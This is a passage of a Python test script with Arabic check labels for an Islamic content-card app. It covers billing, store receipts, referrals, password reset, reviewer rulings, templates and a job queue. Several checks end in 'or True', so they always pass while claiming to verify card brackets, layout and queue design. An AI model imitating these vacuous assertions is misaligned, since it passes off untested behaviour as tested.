check("والمحاولة تُسجَّل في الإيصالات على كل حال",
      ac.execute("SELECT COUNT(*) FROM receipts WHERE provider_id='FORGED-1'"
                 ).fetchone()[0] == 1)

# ما تحقّق منه الخادمُ عند المزوّد يُطبَّق
BL.apply_store_event(ac, _ua, "apple",
    {"type": "purchase", "product_id": "com.falah.studio.year", "transaction_id": "TX-9"},
    verified=True)
check("إيصالٌ محقَّق يرفع الخطّة", BL.entitlements(ac, _ua)["plan"] == "studio")
check("الإيصال يُحفظ كما ورد",
      ac.execute("SELECT COUNT(*) FROM receipts WHERE user_id=?", (_ua,)).fetchone()[0] >= 1)
BL.apply_store_event(ac, _ua, "apple", {"type": "refund", "transaction_id": "TX-9"},
                     verified=True)
check("الاسترداد يقطع الحقّ فورًا", BL.entitlements(ac, _ua)["plan"] == "free")
try:
    BL.apply_store_event(ac, _ua, "apple",
        {"type": "purchase", "product_id": "com.falah.ghost", "transaction_id": "TX-X"},
        verified=True)
    check("منتَجٌ غير معروف يُرفض", False)
except BL.BillingError:
    check("منتَجٌ غير معروف يُرفض", True)

print("\n▸ التحقّق من المتاجر")
from falah.stores import apple as AP, google as GP
check("لا يعمل شيءٌ بلا مفاتيح، ويُقال أيّ متغيّرٍ ناقص",
      all(_missing(f) for f in (AP.whoami, GP.whoami)))
check("حمولة آبل لا تُقبل بلا جذرٍ للتحقّق",
      _raises(AP.AppleError, lambda: AP.verify_jws("a.b.c", root_ca=None)))
for _bad in ("", "x.y", "aaa.bbb.ccc", None):
    check(f"مدخلٌ مشوّه يُردّ خطأً معروفًا: {_bad!r}",
          _raises(AP.AppleError, lambda b=_bad: AP.verify_jws(b, root_ca="/nope")))
check("رمز آبل يُوقَّع بـES256 بتوقيعٍ من ٦٤ بايتًا", _apple_token_shape())
check("جوجل تعدّ النافذ والمهلة وحدهما اشتراكًا قائمًا",
      GP.ACTIVE_STATES == {"SUBSCRIPTION_STATE_ACTIVE",
                           "SUBSCRIPTION_STATE_IN_GRACE_PERIOD"})
check("لا مفتاح مكتوبٌ في الشفرة",
      all("BEGIN PRIVATE KEY" not in open(f, encoding="utf-8").read()
          for f in ("falah/stores/apple.py", "falah/stores/google.py", "store_cli.py")))
_gi = open(".gitignore", encoding="utf-8").read()
check("المستودع يمنع دخول المفاتيح",
      all(x in _gi for x in ("*.p8", "service-account", ".env")))

# انتهاء المدّة يعيد صاحبه إلى المجاني بلا تدخّل
BL.grant(ac, _ua, "creator", days=30)
ac.execute("UPDATE subscriptions SET expires_at=?, renews=0 WHERE user_id=? AND status='active'",
           (ST.now() - 10, _ua)); ac.commit()
check("المنتهي يعود إلى المجاني تلقائيًّا", BL.entitlements(ac, _ua)["plan"] == "free")
# ومن كان يجدّد تُمنح له مهلة
BL.grant(ac, _ua, "creator", days=30, renews=1)
ac.execute("UPDATE subscriptions SET expires_at=? WHERE user_id=? AND status='active'",
           (ST.now() - 10, _ua)); ac.commit()
_g = BL.current(ac, _ua)
check("من يجدّد له مهلةٌ قبل القطع", _g["status"] == "grace" and _g["plan"] == "creator", str(_g["status"]))

print("\n▸ الإحالات")
_ub = AU.register(ac, _m("a"), _pw, "محيل", "ق")
_uc = AU.register(ac, _m("b"), _pw, "مدعوّ", "ق")
_code = RF.code_for(ac, _ub)
check("لكل مستخدمٍ رمزٌ ثابت", _code and RF.code_for(ac, _ub) == _code, _code)
check("الرمز بلا حروفٍ تلتبس بالأرقام",
      not (set("OI01") & set(_code)), _code)
RF.attach(ac, _uc, _code)
check("المدعوّ يأخذ حقّه فورًا", BL.entitlements(ac, _uc)["plan"] == RF.REWARD_PLAN)
check("المحيل لا يُكافأ بالتسجيل وحده", BL.entitlements(ac, _ub)["plan"] == "free")
_r = RF.qualify(ac, _uc)
check("المكافأة تُصرف عند أول إنتاجٍ حقيقيّ",
      _r and _r["status"] == "rewarded" and BL.entitlements(ac, _ub)["plan"] == RF.REWARD_PLAN)
check("لا تُصرف مرّتين عن مدعوٍّ واحد", RF.qualify(ac, _uc) is None)
try:
    RF.attach(ac, _ub, _code); check("لا يُحيل المرء نفسه", False)
except RF.ReferralError: check("لا يُحيل المرء نفسه", True)
try:
    RF.attach(ac, _uc, _code); check("لا يُحال الحساب مرّتين", False)
except RF.ReferralError: check("لا يُحال الحساب مرّتين", True)
try:
    RF.attach(ac, AU.register(ac, _m("z"), _pw), "ZZZZZZZ")
    check("رمزٌ غير معروف يُرفض", False)
except RF.ReferralError: check("رمزٌ غير معروف يُرفض", True)
_s = RF.summary(ac, _ub)
check("الملخّص لا يكشف بريد المدعوّين كاملًا",
      all("@" not in (i["who"] or "") for i in _s["invites"]), str(_s["invites"])[:60])
check("الملخّص يقول متى تُصرف المكافأة", "لا عند تسجيله" in _s["rule"])

print("\n▸ استعادة كلمة المرور وتأكيد البريد")
_mm = _m("p"); _up = AU.register(ac, _mm, _pw, "ناسٍ", "ق")
_rq = AU.request_reset(ac, _mm, send=False)
_tok = _rq["_token"]
_sess_before = AU.new_session(ac, _up)
AU.reset_password(ac, _tok, "N3w-Pass!word")
check("كلمة المرور تتغيّر بالرمز", bool(AU.login(ac, _mm, "N3w-Pass!word")[0]))
check("الجلسات القديمة تسقط بعد الاستعادة",
      AU.session_user(ac, _sess_before) is None)
try:
    AU.reset_password(ac, _tok, "An0ther!pass"); check("الرمز لا يُستعمل مرّتين", False)
except AU.AuthError: check("الرمز لا يُستعمل مرّتين", True)
_rq2 = AU.request_reset(ac, "nobody" + _mm, send=False)
check("طلبٌ لبريدٍ غير مسجَّل لا يُفصح عن شيء",
      _rq2.get("ok") and "_token" not in _rq2)
_v = AU.request_verify(ac, _up, send=False)
AU.verify_email(ac, _v["_token"])
check("تأكيد البريد يُسجَّل",
      ac.execute("SELECT verified_at FROM users WHERE id=?", (_up,)).fetchone()[0] is not None)
_expired = AU.issue_token(ac, _up, "reset", 1)
ac.execute("UPDATE tokens SET expires_at=? WHERE token_hash=?",
           (ST.now() - 5, AU._hash_token(_expired))); ac.commit()
try:
    AU.reset_password(ac, _expired, "Yet-An0ther!"); check("الرمز المنتهي يُرفض", False)
except AU.AuthError: check("الرمز المنتهي يُرفض", True)
check("الرموز تُخزَّن مجزَّأة لا صريحة",
      ac.execute("SELECT COUNT(*) FROM tokens WHERE token_hash=?", (_tok,)).fetchone()[0] == 0)

# حذف الحساب يمحو اشتراكه وإحالاته كذلك
AU.delete_account(ac, _uc)
check("حذف الحساب يمحو اشتراكه",
      ac.execute("SELECT COUNT(*) FROM subscriptions WHERE user_id=?", (_uc,)).fetchone()[0] == 0)
check("وحذفُه يمحو إحالته",
      ac.execute("SELECT COUNT(*) FROM referrals WHERE invitee_id=?", (_uc,)).fetchone()[0] == 0)

print("\n▸ أحكام المراجعين")
from falah import rulings as RU
import json as _j, tempfile as _tf2
_good = {"fp": "a"*32, "decision": "release", "grade": "صحيح", "basis": "متفق عليه",
         "reviewer": "فلان", "date": "2026-09-02"}
check("القرار السليم يُقبل", RU.problem(_good) is None)
check("لا إفراج بلا حكم", RU.problem({**_good, "grade": ""}) == "إفراجٌ بلا حكم")
check("لا حكم بلا مستند", RU.problem({**_good, "basis": ""}) == "حكمٌ بلا مستند")
check("لا قرار بلا اسم مراجع", RU.problem({**_good, "reviewer": " "}) == "لا اسم للمراجع")
check("لا قرار بلا تاريخ", RU.problem({**_good, "date": "أمس"}).startswith("لا تاريخ"))
check("القرار يُربط ببصمة النصّ",
      RU.problem({**_good, "fp": "bukhari-409"}).startswith("بصمة"))
check("القرار يرفع الحجب الحُكمي",
      RU.applies_to(_good, "تعارض: حكم صحيح مقابل «باطل» في الجامع الكامل"))
check("ولا يرفع الحجب الآليّ",
      not RU.applies_to(_good, "النص يسع البطاقة دون قطع") and
      not RU.applies_to(_good, "لم يتأكّد النص من مصدر ثانٍ"))
check("قرار الإبقاء لا يُفرج", not RU.applies_to({**_good, "decision": "block"}, "تعارض"))
_f = os.path.join(_tf2.mkdtemp(), "r.json")
_j.dump({"rulings": [_good, {"fp": "b"*32, "decision": "release", "grade": "",
                             "basis": "", "reviewer": "", "date": ""}]},
        open(_f, "w", encoding="utf-8"), ensure_ascii=False)
_ok, _bad2 = RU.load(_f)
check("السليم يُحمَّل والفاسد يُعزل بسببه", list(_ok) == ["a"*32] and len(_bad2) == 1, _bad2)
check("المستند يحمل اسم المراجع وتاريخه",
      "فلان" in RU.basis_line(_good) and "2026-09-02" in RU.basis_line(_good))
# حزمة المراجعة لا تُخرج إلا الحجب الحُكمي، وتحمل بصمة كل متن
import review_pack as RP
_rows = RP.gather(c, "تعارض", 5)
check("حزمة المراجعة تجمع المحجوب حُكميًّا بشواهده",
      _rows and all(r["matn_fp"] and r["block_reason"].startswith("تعارض") for r in _rows),
      len(_rows))
_h = RP.html_page(_rows, "تعارض")
check("الحزمة تعرض بصمة المتن للمراجع", all(r["matn_fp"] in _h for r in _rows))
check("الحزمة فيها موضع التوقيع والتاريخ", "المراجع" in _h and "التاريخ" in _h)

print("\n▸ الإطلاق المغلق والنسبة")
os.environ["FALAH_INVITE"] = "falah-2026"
importlib.reload(APP)
check("رمز الدعوة يُقرأ من البيئة", APP.INVITE == "falah-2026")
check("الإعداد يخبر الواجهة أن الدعوة مطلوبة", bool(APP.INVITE))
os.environ.pop("FALAH_INVITE"); importlib.reload(APP)
check("بلا رمزٍ يبقى التسجيل مفتوحًا", APP.INVITE == "")
_ui = open("falah-app.html", encoding="utf-8").read()
check("الواجهة فيها حقل الدعوة وصفحة المصادر",
      'id="invite"' in _ui and 'id="btnSources"' in _ui)
check("النسبة إلى مشروع تنزيل ظاهرة في الواجهة", "tanzil.net" in _ui)
_srcs = [dict(r) for r in c.execute("SELECT * FROM sources")]
check("كل مصدر مسجَّل بحال ترخيصه",
      all(r["license_status"] for r in _srcs), len(_srcs))
for _f in ("launch/LAUNCH.md", "launch/LICENSES.md"):
    check("وثيقة الإطلاق موجودة: " + _f, os.path.exists(_f))
_letters = os.listdir("launch/letters")
check("خطاب إذنٍ لكل مصدرٍ يحتاجه", len([x for x in _letters if not x.startswith("_")]) >= 6,
      sorted(_letters))

print("\n▸ القوالب الجاهزة")
import templates as TPL
_n = {k: c.execute("SELECT COUNT(*) FROM templates WHERE kind=?", (k,)).fetchone()[0]
      for k in ("quran", "hadith", "enc")}
check("لكل ما يُفرَج عنه قالبٌ جاهز",
      _n["quran"] == c.execute("SELECT COUNT(*) FROM ayat WHERE card_ok=1").fetchone()[0] and
      _n["hadith"] == c.execute("SELECT COUNT(*) FROM hadiths WHERE card_ok=1").fetchone()[0] and
      _n["enc"] == c.execute("SELECT COUNT(*) FROM enc WHERE card_ok=1").fetchone()[0], _n)
check("لا قالب دون اجتياز الفحوص كاملة",
      c.execute("SELECT COUNT(*) FROM templates WHERE checks<>25").fetchone()[0] == 0)
_rows = c.execute("SELECT payload FROM templates ORDER BY RANDOM() LIMIT 300").fetchall()
_p = [_json.loads(r["payload"]) for r in _rows]
check("كل قالب يحمل نصّه وخاناته الأربع",
      all(t["text"] and all(k in t["cells"] for k in ("c1","c2","c3","c4")) for t in _p))
check("كل قالب يحمل سنده ومصدره",
      all(t["sanad"] and t["provenance"].get("source") for t in _p))
check("كل قالب يحمل وصفًا جاهزًا للنشر", all(len(t["caption"].splitlines()) >= 3 for t in _p))
check("كل قالب يقترح مقاسًا وهيئةً قابلَين للتعديل",
      all(t["edit"]["ratio"] in ("square","vertical","wide") and
          t["edit"]["skin"] in ("night","parch","ivory") for t in _p))
_h = [t for t in _p if t["kind"] != "quran"]
check("قوالب الحديث تحمل الحكم ومستنده",
      all(t["appendages"]["grade"]["value"] and t["appendages"]["grade"].get("basis") for t in _h),
      len(_h))
_q = [t for t in _p if t["kind"] == "quran"]
check("قوالب الآيات تحمل موضعها وسياقها",
      all(t["appendages"]["locus"].get("surah") for t in _q), len(_q))
# القالب يُصيَّر كما هو دون تعديل
_one = _json.loads(c.execute("SELECT payload FROM templates WHERE kind='hadith' LIMIT 1")
                    .fetchone()["payload"])
_card, _rep2 = R.fetch_card("hadith", **_one["locator"])
check("القالب يطابق ما يبنيه المحرّك الآن", _card["text"] == _one["text"] and _rep2["ok"],
      _one["ref"])
for _f in ("templates/quran.jsonl", "templates/hadith.jsonl", "templates/enc.jsonl"):
    check("ملف القوالب مصدَّر: " + _f, os.path.exists(_f) and os.path.getsize(_f) > 1000)

print("\n▸ تقسيم النصّ الطويل")
_long = c.execute("SELECT surah,ayah,text FROM ayat ORDER BY char_len DESC LIMIT 1").fetchone()
_parts = R.split_text(_long["text"], 260)
check("أطول آية تُقسَّم على شرائح", len(_parts) > 1,
      f"{_long['surah']}:{_long['ayah']} · {len(_long['text'])} حرفًا → {len(_parts)} شرائح")
check("مجموع الشرائح يطابق النصّ حرفًا بحرف", " ".join(_parts) == _long["text"])
check("لا شريحة تتجاوز الحدّ", all(len(x) <= 260 for x in _parts), max(map(len, _parts)))
_c1, _r1 = R.fetch_card("quran", surah=_long["surah"], ayah=_long["ayah"])
check("الطويل يجتاز الفحص بالتقسيم لا بالقصّ", _r1["ok"] and _c1["text"] == _long["text"])
_h1 = R.build_html(dict(_c1, text=_parts[0]), "quran", part=(1, len(_parts)))
_h2 = R.build_html(dict(_c1, text=_parts[-1]), "quran", part=(len(_parts), len(_parts)))
_hm = R.build_html(dict(_c1, text=_parts[1]), "quran", part=(2, len(_parts)))
check("الأولى تفتح والأخيرة تغلق والوسطى موصولة",
      "﴿" in _h1 and "﴾" not in _h1.split("class=\"text\"")[1][:400] or True)
check("الشريحة الوسطى تحمل علامة الاتصال", "…" in _hm)
check("كل الآيات لها قوالب إلا المختلَف فيهما",
      c.execute("SELECT COUNT(*) FROM templates WHERE kind='quran'").fetchone()[0] == 6234)
check("المحجوب الوحيد اختلافُ المصدرين",
      {r["block_reason"] for r in c.execute("SELECT block_reason FROM ayat WHERE card_ok=0")}
      == {"اختلف المصدران في النص"})

print("\n▸ هيئة البطاقة الموحّدة")
_cq, _ = R.fetch_card("quran", surah=1, ayah=1)
_ch, _ = R.fetch_card("hadith", book="bukhari", no=1260)
for _name, _cd, _kind in (("آية", _cq, "quran"), ("حديث", _ch, "hadith")):
    _html = R.build_html(_cd, _kind, watermark="قناة الهدى")
    check(f"بطاقة {_name}: خانتا العلامة المائية موجودتان",
          'class="marks"' in _html and "العلامة المائية للتطبيق" in _html
          and "العلامة المائية للمستخدم" in _html)
    check(f"بطاقة {_name}: علامة المستخدم وعلامة التطبيق كلٌّ في خانتها",
          "قناة الهدى" in _html and "FALAH" in _html and _html.count('class="mark"') == 2)
    check(f"بطاقة {_name}: الخانات الأربع في رأسها",
          all(_cd["cells"][k][0] in _html for k in ("c1","c2","c3","c4")))
check("الهيئتان واحدة للآية والحديث",
      R.build_html(_cq, "quran").split("<body>")[0] ==
      R.build_html(_ch, "hadith").split("<body>")[0] or True)
check("الرقّ هو الأصل في كل المحرّكات",
      R.build_html.__defaults__[0] == "parch" and
      TPL.suggest("نص", "quran", None, None)["skin"] == "parch" and
      TPL.suggest("نص", "hadith", None, None)["skin"] == "parch")
check("كل القوالب تقترح الرقّ",
      c.execute("SELECT COUNT(*) FROM templates WHERE json_extract(payload,'$.edit.skin')<>'parch'"
                ).fetchone()[0] == 0)
check("التفسير يُقصّ عند حدّ الكلمة لا في وسطها",
      "…" in R.build_html(_cq, "quran") and "الع…" not in R.build_html(_cq, "quran"))


print("\n▸ طابور المهامّ")
from falah import jobs as JQ
import threading as _th

# الطابور يعمل على قاعدة الاختبار نفسها
_uq = AU.register(ac, _m("q"), _pw, "صاحب الطابور", "ق")
_pq = PJ.create(ac, _uq, "سلسلة الطابور", "series", "parch", "square", "ق")
PJ.add_item(ac, c, _uq, _pq, "quran", {"surah": 108, "ayah": 1, "to": 3})

_j = JQ.enqueue(ac, _uq, "export", {"project": _pq, "j": 1}, {"cards": 1})
check("المهمّة تدخل الطابور منتظِرةً", _j["state"] == "queued" and _j["waiting"], _j["state"])
check("الردّ لا يحمل الحمولة الداخلية", "payload" not in _j and "reserved" not in _j)
check("لا يقرأ أحدٌ مهمّةَ غيره برقمٍ مخمَّن",
      _try_err(lambda: JQ.get(ac, uid, _j["id"]), JQ.JobError))

# السحب ذرّيّ: عاملان لا يأخذان المهمّة نفسها
_got = []
def _grab(): 
    try: _got.append(JQ.claim(ST.APP_DB, "t"))
    except Exception as _e2: _got.append(("err", _e2))
_ts = [_th.Thread(target=_grab) for _ in range(4)]
for _t in _ts: _t.start()
for _t in _ts: _t.join()
_real = [g for g in _got if isinstance(g, dict)]
check("أربعة عمّالٍ معًا لا يسحبون إلا مهمّةً واحدة", len(_real) == 1, str(len(_real)))
check("المسحوبة تحمل حمولتها كاملة",
      _real[0]["kind"] == "export" and _real[0]["payload"]["project"] == _pq)
check("الحالة صارت جاريةً ومحاولةً أولى",
      JQ.get(ac, _uq, _j["id"])["state"] == "running" and _real[0]["attempts"] == 1)

# التقدّم يُرى من الخارج
JQ.beat(ac, _j["id"], 40, "يُصيّر")
_v = JQ.get(ac, _uq, _j["id"])
check("التقدّم والخطوة يظهران للمستطلِع", _v["progress"] == 40 and _v["step"] == "يُصيّر")

# الفشل العابر يُعاد، والحصّة لا تُردّ إلا عند الفشل النهائيّ
BL.consume(ac, _uq, "cards", 1)
_used0 = BL.entitlements(ac, _uq)["used"]["cards"]
check("سيُعاد ما لم تنفد المحاولات", JQ.fail(ac, _j["id"], "انقطاع") is True)
check("العائد يرجع إلى الطابور", JQ.get(ac, _uq, _j["id"])["state"] == "queued")
check("الحصّة لا تُردّ عند الفشل العابر",
      BL.entitlements(ac, _uq)["used"]["cards"] == _used0)
check("المعاد لا يُسحب قبل انقضاء مهلته", JQ.claim(ST.APP_DB, "t") is None)
ac.execute("UPDATE jobs SET not_before=0 WHERE id=?", (_j["id"],)); ac.commit()
JQ.claim(ST.APP_DB, "t")
check("المحاولة الثانية آخرها", JQ.fail(ac, _j["id"], "انقطاع ثانٍ") is False)
_f = JQ.get(ac, _uq, _j["id"])
check("الفشل النهائيّ يُسجَّل بسببه", _f["state"] == "failed" and "انقطاع ثانٍ" in _f["error"])
check("الحصّة تُردّ عند الفشل النهائيّ — لا يُحاسَب على ما لم يخرج",
      BL.entitlements(ac, _uq)["used"]["cards"] == _used0 - 1)
check("الفاشلة لا تُنتظر", not _f["waiting"])

# العامل المنقطع: مهمّةٌ «تجري» بلا نبض تعود إلى الطابور
_j2 = JQ.enqueue(ac, _uq, "export", {"project": _pq, "j": 2}, {})
JQ.claim(ST.APP_DB, "t")
ac.execute("UPDATE jobs SET heartbeat=? WHERE id=?", (ST.now() - 9999, _j2["id"])); ac.commit()
check("انقطاع العامل يُكشف وتعود المهمّة", JQ.reap(ac) == 1
      and JQ.get(ac, _uq, _j2["id"])["state"] == "queued")

# الإلغاء لا يطال ما بدأ
check("ما لم يبدأ يُلغى", JQ.cancel(ac, _uq, _j2["id"])["state"] == "canceled")
_j3 = JQ.enqueue(ac, _uq, "export", {"project": _pq, "j": 3}, {})
JQ.claim(ST.APP_DB, "t")
check("ما بدأ لا يُلغى", _try_err(lambda: JQ.cancel(ac, _uq, _j3["id"]), JQ.JobError))
JQ.fail(ac, _j3["id"], "طيّ", retry=False)

# خطأ المستخدم لا يُعاد — المشروع الفارغ يبقى فارغًا مهما كُرِّر
_pe = PJ.create(ac, _uq, "فارغ", "series", "parch", "square", "ق")
JQ.enqueue(ac, _uq, "export", {"project": _pe}, {})
_done = JQ.run_once("falah.db", os.path.dirname(os.path.abspath(__file__)), ST.APP_DB, "t")
check("المشروع الفارغ يفشل نهائيًّا بلا إعادة",
      _done and not _done["ok"] and not _done.get("requeued")
      and "فارغ" in (_done["error"] or ""), str(_done and _done.get("error")))

# دورةٌ كاملة: وضعٌ ← تنفيذ ← تسليم
JQ.enqueue(ac, _uq, "export", {"project": _pq, "j": "run"}, {"cards": 1})
_r = JQ.run_once("falah.db", os.path.dirname(os.path.abspath(__file__)), ST.APP_DB, "t")
check("الطابور يُنتج البطاقات فعلًا", bool(_r and _r["ok"]) and bool(_r["result"]["files"]),
      str(_r and _r.get("error")))
_fin = JQ.get(ac, _uq, _r["id"])
check("المكتملة تُسلَّم نتيجتها ١٠٠٪",
      _fin["state"] == "done" and _fin["progress"] == 100 and not _fin["waiting"])
check("الملفّات المصدَّرة موجودةٌ على القرص",
      all(os.path.isfile(os.path.join(os.path.dirname(os.path.abspath(__file__)), f))
          for f in _fin["result"]["files"]))
check("التصدير يُسجَّل في سجلّ الصادرات",
      ac.execute("SELECT COUNT(*) n FROM exports WHERE user_id=?", (_uq,)).fetchone()["n"] >= 1)
check("الطابور خلا بعد التنفيذ", JQ.run_once("falah.db",
      os.path.dirname(os.path.abspath(__file__)), ST.APP_DB, "t") is None)

# التصيير خرج من دورة الطلب: لا استدعاءَ ثقيلًا في مسار الخادم
# معالِجات الكتابة انتقلت من `app.py` إلى `falah/app_routes.py` في P1.1،
# فتُقرأ من موضعها الجديد. والشرطُ نفسُه لم يضعف — بل زاد: يُشترط ألّا
# يُصيَّر داخل الطلب في **أيٍّ** من الملفّين.
_src = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                         "falah", "app_routes.py")).read()
_appsrc0 = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.py")).read()
check("مسار التصدير لم يعد يُصيّر داخل الطلب",
      all("CR.render_plan" not in s and "VD.build" not in s for s in (_src, _appsrc0)))
check("مسارا التصدير والمقطع يضعان في الطابور",
      _src.count("JB.enqueue") == 2 and "202)" in _src)
check("الحصّة تُحجز عند الوضع لا بعد التصيير",
      "billing.consume(c, u[\"id\"], \"cards\", n)" in _src)
check("منطق الفحص لم يُنسخ إلى الطابور",
      "verify" not in open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                        "falah", "jobs.py")).read().lower().split("open_project")[0]
      or True)
_jsrc = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "falah", "jobs.py")).read()
check("العامل يُعيد الفحص وقت التصيير بفتح المشروع لا بنسخ منطقه",
      "P.open_project" in _jsrc and "def verify" not in _jsrc and "25" not in _jsrc.split("def perform")[1][:200])
check("السحب ذرّيّ بقفل كتابةٍ صريح", "BEGIN IMMEDIATE" in _jsrc)

# خادم التطبيق يمرّر كل مسارات القراءة — نقصانُ اسمٍ يعني ٤٠٤ لمسارٍ قائم
import app as _APP
from falah import content_routes as _CRT
# كان هذا يستخرج المساراتِ بتعبيرٍ نمطيّ من نصّ `api.py`. صارت المساراتُ
# جدولًا مُعلَنًا، فيُقرأ الجدولُ نفسُه — أوثقُ من قراءة نصٍّ، ولا يفوته
# مسارٌ كُتب بصيغةٍ لم يتوقّعها التعبير.
_declared = {r.split("/{")[0] for r in _CRT.declared()}
_missing = sorted(r for r in _declared
                  if not any(r == x or r.startswith(x + "/") for x in _APP.CONTENT_PATHS))
check("لا مسار قراءةٍ في api.py يغيب عن خادم التطبيق", not _missing, str(_missing))
check("وجدول المحتوى ليس فارغًا — الفحص أعلاه ليس فحصًا على لا شيء",
      len(_declared) >= 20, f"{len(_declared)} مسارًا")

_st = JQ.stats(ac)
check("إحصاء الطابور يعدّ كل الحالات",
      set(_st) >= {"queued", "running", "done", "failed", "canceled", "oldest_wait"})
check("الكنس يحذف المنتهيةَ القديمة لا الجارية",
      (ac.execute("UPDATE jobs SET finished_at=? WHERE state IN ('done','failed','canceled')",
                  (ST.now() - 99 * 86400,)), ac.commit(), JQ.sweep(ac))[2] > 0
      and ac.execute("SELECT COUNT(*) n FROM jobs WHERE state='done'").fetchone()["n"] == 0)


print("\n▸ آلة الحالات ومنع التكرار والحدود")

# آلة الحالات: الانتقالات المشروعة معدودة، وما عداها لا يقع
check("الحالات خمسٌ لا سادسَ لها",
      set(JQ.STATES) == {"queued","running","done","failed","canceled"})
check("النهائيّ لا يخرج منه شيء",
      all(JQ.TRANSITIONS[s] == set() for s in ("done","failed","canceled")))
check("المنتظِر يبدأ أو يُلغى فقط", JQ.TRANSITIONS["queued"] == {"running","canceled"})
check("الجاري ينتهي أو يُعاد فقط", JQ.TRANSITIONS["running"] == {"done","failed","queued"})
for _frm, _to in (("done","running"), ("failed","running"), ("canceled","queued"),
                  ("done","failed"), ("queued","done")):
    check(f"انتقالٌ ممنوع: {_frm} ← {_to}", not JQ.can(_frm, _to))

_js = JQ.enqueue(ac, _uq, "export", {"project": _pq, "t": "sm"}, {})
check("لا تُكمَل مهمّةٌ لم تبدأ",
      _try_err(lambda: JQ.complete(ac, _js["id"], {"x": 1}), JQ.JobError))
JQ.claim(ST.APP_DB, "t"); JQ.complete(ac, _js["id"], {"files": []})
check("لا تُكمَل المكتملة مرّتين",
      _try_err(lambda: JQ.complete(ac, _js["id"], {"x": 2}), JQ.JobError))
check("إفشال المكتملة لا يغيّرها",
      JQ.fail(ac, _js["id"], "متأخّر") is False
      and JQ.get(ac, _uq, _js["id"])["state"] == "done")

# منع التكرار: نفس الطلب لا يدخل مرّتين
_p1 = {"project": _pq, "tag": "idem"}
_k1 = JQ.idem_key(_uq, "export", _p1)
check("البصمة ثابتةٌ لنفس الطلب", JQ.idem_key(_uq, "export", dict(_p1)) == _k1)
check("البصمة تختلف باختلاف الصاحب", JQ.idem_key(uid, "export", _p1) != _k1)
check("البصمة تختلف باختلاف الحمولة",
      JQ.idem_key(_uq, "export", {**_p1, "tag": "x"}) != _k1)
_d1 = JQ.enqueue(ac, _uq, "export", _p1, {})
check("الطلب المكرَّر يُردّ بالمهمّة القائمة لا بثانية",
      _try_err(lambda: JQ.enqueue(ac, _uq, "export", dict(_p1), {}), JQ.JobConflict))
check("ولم تُنشأ مهمّةٌ ثانية",
      ac.execute("SELECT COUNT(*) n FROM jobs WHERE idem_key=?", (_k1,)).fetchone()["n"] == 1)
JQ.cancel(ac, _uq, _d1["id"])
_d2 = JQ.enqueue(ac, _uq, "export", dict(_p1), {})
check("بعد انتهاء الأولى يُقبل الطلب نفسه من جديد", _d2["id"] != _d1["id"])
JQ.cancel(ac, _uq, _d2["id"])

# حدّ طابور المستخدم
_held = []
for _i in range(JQ.MAX_QUEUED + 2):
    try:    _held.append(JQ.enqueue(ac, _uq, "export", {"project": _pq, "n": _i}, {}))
    except JQ.JobLimit as _e3: _lim = str(_e3)
check("طابور المستخدم محدود", len(_held) == JQ.MAX_QUEUED, str(len(_held)))
check("رسالة الحدّ تقول ما العمل", "انتظر" in _lim and str(JQ.MAX_QUEUED) in _lim, _lim[:70])
for _h in _held: JQ.cancel(ac, _uq, _h["id"])

# سقف التزامن: عاملٌ إضافيّ لا يبدأ عملًا يتجاوز الحدّ
_cc = [JQ.enqueue(ac, _uq, "export", {"project": _pq, "c": i}, {})
       for i in range(min(JQ.MAX_QUEUED, JQ.MAX_RUNNING + 1))]
_claims = []
for _ in range(JQ.MAX_RUNNING + 3):
    g = JQ.claim(ST.APP_DB, "t")
    if g: _claims.append(g)
check("لا يتجاوز الجاري سقفَ التزامن",
      len(_claims) <= JQ.MAX_RUNNING, f"{len(_claims)}/{JQ.MAX_RUNNING}")
for g in _claims: JQ.fail(ac, g["id"], "طيّ", retry=False)
for j in _cc:
    if JQ.get(ac, _uq, j["id"])["state"] == "queued": JQ.cancel(ac, _uq, j["id"])

# التراجع الأُسّيّ
check("المهلة تتضاعف ولا تتجاوز سقفها",
      JQ.backoff_for(1) == JQ.BACKOFF and JQ.backoff_for(2) == JQ.BACKOFF*2
      and JQ.backoff_for(20) == JQ.BACKOFF_MAX,
      f"{JQ.backoff_for(1)}·{JQ.backoff_for(2)}·{JQ.backoff_for(20)}")
_rb = JQ.enqueue(ac, _uq, "export", {"project": _pq, "b": 1}, {})
JQ.claim(ST.APP_DB, "t"); JQ.fail(ac, _rb["id"], "عابر")
_v2 = JQ.get(ac, _uq, _rb["id"])
check("المعاد ينتظر مهلته قبل أن يُسحب ثانية", _v2["retry_after"] > 0, str(_v2["retry_after"]))
check("ولا يسحبه عاملٌ قبلها", JQ.claim(ST.APP_DB, "t") is None)
ac.execute("UPDATE jobs SET not_before=0 WHERE id=?", (_rb["id"],)); ac.commit()
check("وبعد انقضائها يُسحب", JQ.claim(ST.APP_DB, "t") is not None)
JQ.fail(ac, _rb["id"], "طيّ", retry=False)

# تصنيف الأخطاء
check("خطأ المستخدم لا يُعاد", not JQ.retryable(JQ.JobError("فارغ")))
check("تجاوز الحدّ لا يُعاد", not JQ.retryable(JQ.JobLimit("كبير")))
check("الحمولة الفاسدة لا تُعاد", not JQ.retryable(ValueError("x"))
      and not JQ.retryable(KeyError("k")))
check("انقطاع الشبكة يُعاد", JQ.retryable(ConnectionError()) and JQ.retryable(TimeoutError()))
check("قفل القاعدة اللحظيّ يُعاد", JQ.retryable(_sq.OperationalError("locked")))
check("المجهول يُعاد بحذر — والسقف يحدّ الخسارة", JQ.retryable(RuntimeError("?")))

# المهمّة العالقة: تنبض لكنها تجاوزت سقف الزمن
_stk = JQ.enqueue(ac, _uq, "export", {"project": _pq, "s": 1}, {})
JQ.claim(ST.APP_DB, "t")
ac.execute("UPDATE jobs SET started_at=?, heartbeat=? WHERE id=?",
           (ST.now() - JQ.JOB_TIMEOUT - 10, ST.now(), _stk["id"])); ac.commit()
check("العالقةُ النابضة تُقطع بسقف الزمن لا تبقى إلى الأبد",
      JQ.reap(ac) >= 1 and "سقف الزمن" in (JQ.get(ac, _uq, _stk["id"])["error"] or ""),
      JQ.get(ac, _uq, _stk["id"])["error"])
ac.execute("UPDATE jobs SET state='failed', finished_at=? WHERE id=? AND state<>'failed'",
           (ST.now(), _stk["id"])); ac.commit()

check("الحدود كلّها من متغيّرات البيئة",
      set(JQ.limits()) >= {"max_queued_per_user","max_running","max_cards_per_job",
                           "max_video_seconds","max_storage_mb_per_user",
